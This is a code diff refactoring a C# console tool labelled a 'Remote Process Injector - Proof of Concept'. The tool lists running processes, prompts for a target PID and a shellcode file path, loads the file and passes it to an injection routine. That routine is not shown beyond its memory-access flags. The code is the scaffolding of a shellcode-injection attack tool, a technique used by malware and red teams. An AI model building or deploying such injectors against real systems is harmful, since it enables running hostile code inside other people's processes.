@@ -5,8 +5,6 @@ using System.Runtime.InteropServices;
 
 static class Program
 {
-    private const string shellcodePath = "C:\\temp\\shellcode.bin";
-
     static void Main()
     {
         Logger.Banner("Remote Process Injector - Proof of Concept");
@@ -23,14 +21,60 @@ static class Program
     private static void RunInjector()
     {
         ProcessHelper.ListRunningProcesses();
-        uint pid = GetPid();
+        uint pid = ProcessHelper.GetPid();
         if (pid == 0) return;
 
+        string shellcodePath = ShellcodeLoader.GetShellcodePath();
+        if (string.IsNullOrEmpty(shellcodePath)) return;
+
         byte[] shellcode = ShellcodeLoader.LoadExternalFile(shellcodePath);
+        if (shellcode == null) return;
+
         Injector.Inject(pid, shellcode);
     }
+}
 
-    private static uint GetPid()
+class Logger
+{
+    public static void Info(string msg) => Log("[*]", msg);
+    public static void Error(string msg) => Log("[!]", msg);
+    public static void Success(string msg) => Log("[+]", msg);
+    public static void Win32Error(string msg)
+    {
+        int err = Marshal.GetLastWin32Error();
+        Error($"{msg} Code: {err}");
+    }
+
+    public static void Banner(string title)
+    {
+        Console.WriteLine($"===[{title}]==");
+    }
+
+    private static void Log(string prefix, string msg)
+    {
+        Console.WriteLine($"{prefix} {msg}");
+    }
+}
+
+static class ProcessHelper
+{
+    public static void ListRunningProcesses()
+    {
+        Logger.Info("List of active processes: ");
+        foreach (var process in Process.GetProcesses())
+        {
+            try
+            {
+                Logger.Info($"Name: {process.ProcessName}, PID: {process.Id}");
+            }
+            catch (Exception ex)
+            {
+                Logger.Error($"Error listing processes: {ex.Message}");
+            }
+        }
+    }
+
+    public static uint GetPid()
     {
         Logger.Info("Enter the target process PID: ");
         if (!uint.TryParse(Console.ReadLine(), out uint pid))
@@ -44,8 +88,60 @@ static class Program
             Logger.Error("Process not found.");
             return 0;
         }
-
         return pid;
+    }
+
+    public static bool ProcessExists(uint pid)
+    {
+        try
+        {
+            Process.GetProcessById((int)pid);
+            return true;
+        }
+        catch
+        {
+            return false;
+        }
+    }
+}
+
+static class ShellcodeLoader
+{
+    public static string GetShellcodePath()
+    {
+        while (true)
+        {
+            Logger.Info("Enter the full path to the shellcode file:");
+            string path = Console.ReadLine();
+
+            if (string.IsNullOrWhiteSpace(path))
+            {
+                Logger.Error("Path cannot be empty.");
+                continue;
+            }
+
+            if (!File.Exists(path))
+            {
+                Logger.Error("File not found.");
+                continue;
+            }
+
+            return path;
+        }
+    }
+
+    public static byte[] LoadExternalFile(string filePath)
+    {
+        if (!File.Exists(filePath))
+            throw new FileNotFoundException("Shellcode file not found.", filePath);
+
+        byte[] shellcode = File.ReadAllBytes(filePath);
+
+        if (shellcode.Length == 0)
+            throw new InvalidDataException("Shellcode is empty.");
+
+        Logger.Info($"Shellcode loaded successfully ({shellcode.Length} bytes)");
+        return shellcode;
     }
 }
 
@@ -140,76 +236,5 @@ static class Injector
         PROCESS_VM_OPERATION = 0x0008,
         PROCESS_VM_WRITE = 0x0020,
         PROCESS_VM_READ = 0x0010
-    }
-}
-
-static class ShellcodeLoader
-{
-    public static byte[] LoadExternalFile(string filePath)
-    {
-        if (!File.Exists(filePath))
-            throw new FileNotFoundException("Shellcode file not found.", filePath);
-
-        byte[] shellcode = File.ReadAllBytes(filePath);
-
-        if (shellcode.Length == 0)
-            throw new InvalidDataException("Shellcode is empty.");
-
-        Logger.Info($"Shellcode loaded successfully ({shellcode.Length} bytes)");
-        return shellcode;
-    }
-}
-
-static class ProcessHelper
-{
-    public static void ListRunningProcesses()
-    {
-        Logger.Info("List of active processes: ");
-        foreach (var process in Process.GetProcesses())
-        {
-            try
-            {
-                Logger.Info($"Name: {process.ProcessName}, PID: {process.Id}");
-            }
-            catch (Exception ex)
-            {
-                Logger.Error($"Error listing processes: {ex.Message}");
-            }
-        }
-    }
-
-    public static bool ProcessExists(uint pid)
-    {
-        try
-        {
-            Process.GetProcessById((int)pid);
-            return true;
-        }
-        catch
-        {
-            return false;
-        }
-    }
-}
-
-class Logger
-{
-    public static void Info(string msg) => Log("[*]", msg);
-    public static void Error(string msg) => Log("[!]", msg);
-    public static void Success(string msg) => Log("[+]", msg);
-    public static void Win32Error(string msg)
-    {
-        int err = Marshal.GetLastWin32Error();
-        Error($"{msg} Code: {err}");
-    }
-
-    public static void Banner(string title)
-    {
-        Console.WriteLine($"===[{title}]==");
-    }
-
-    private static void Log(string prefix, string msg)
-    {
-        Console.WriteLine($"{prefix} {msg}");
     }
 }
